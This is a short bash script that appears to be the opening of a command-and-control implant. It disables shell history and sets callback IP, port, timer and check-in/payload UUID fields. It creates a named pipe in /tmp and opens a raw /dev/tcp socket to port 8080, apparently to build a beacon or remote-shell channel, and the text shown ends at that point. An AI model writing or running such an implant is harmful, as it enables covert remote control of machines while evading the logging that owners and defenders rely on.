#!/usr/bin/env bash

set -e

HISTFILE=/dev/null
HISTFILESIZE=0
HISTSIZE=0

# ----------------------- CONFIG ----------------------- #
CALLBACK_IP=127.0.0.1
CALLBACK_PORT=8080
CALLBACK_TIMER=2
CALLBACK_TIMEOUT=2

CHECKIN_COMPLETE=0
CHECKIN_UUID=
PAYLOAD_UUID=
# ----------------------- CONFIG ----------------------- #

RET_PIPE=/tmp/testpipe
RUNNING=1

trap "rm -f $RET_PIPE" EXIT

if [[ ! -p $RET_PIPE ]]; then
    mkfifo $RET_PIPE
fi

{ exec {FD}<>/dev/tcp/0.0.0.0/8080; } ;